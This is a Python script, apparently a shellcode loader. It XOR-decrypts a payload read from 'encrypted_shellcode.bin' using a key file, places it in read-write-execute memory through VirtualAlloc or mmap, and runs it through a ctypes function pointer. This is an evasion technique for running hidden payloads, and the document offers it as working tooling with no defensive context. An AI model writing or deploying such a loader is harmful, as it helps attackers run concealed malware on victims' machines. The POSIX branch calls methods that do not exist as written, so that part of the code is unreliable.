import ctypes
import mmap
import sys

# XOR decryption (using same keys to reverse the process)
def chaotic_decrypt(encrypted_shellcode, keys):
    decrypted_shellcode = bytearray()
    for i in range(len(encrypted_shellcode)):
        decrypted_shellcode.append(encrypted_shellcode[i] ^ keys[i])
    return decrypted_shellcode

# Load the encrypted shellcode and keys
with open("encrypted_shellcode.bin", "rb") as f:
    encrypted_shellcode = bytearray(f.read())

with open("keys.txt", "r") as f:
    keys = list(map(int, f.read().strip().split(",")))

# Decrypt the shellcode
decrypted_shellcode = chaotic_decrypt(encrypted_shellcode, keys)

# Allocate memory for the shellcode
shellcode_size = len(decrypted_shellcode)
if sys.platform == "win32":
    # Windows-specific memory allocation with execute permissions
    executable_memory = ctypes.windll.kernel32.VirtualAlloc(None, shellcode_size, 0x3000, 0x40)
    if not executable_memory:
        raise MemoryError("Failed to allocate executable memory.")
    # Convert the decrypted shellcode to bytes for compatibility
    shellcode_buffer = (ctypes.c_char * shellcode_size).from_buffer_copy(decrypted_shellcode)
    ctypes.memmove(executable_memory, shellcode_buffer, shellcode_size)
else:
    # POSIX-compliant systems (Linux, macOS)
    executable_memory = mmap.mmap(-1, shellcode_size, mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS)
    executable_memory.write(decrypted_shellcode)
    executable_memory.protect(mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)

# Get a function pointer to the shellcode
if sys.platform == "win32":
    ctypes_shellcode = ctypes.CFUNCTYPE(ctypes.c_void_p)(executable_memory)
else:
    ctypes_shellcode = ctypes.CFUNCTYPE(ctypes.c_void_p)(ctypes.addressof(ctypes.c_buffer(executable_memory, shellcode_size)))

# Execute the shellcode
ctypes_shellcode()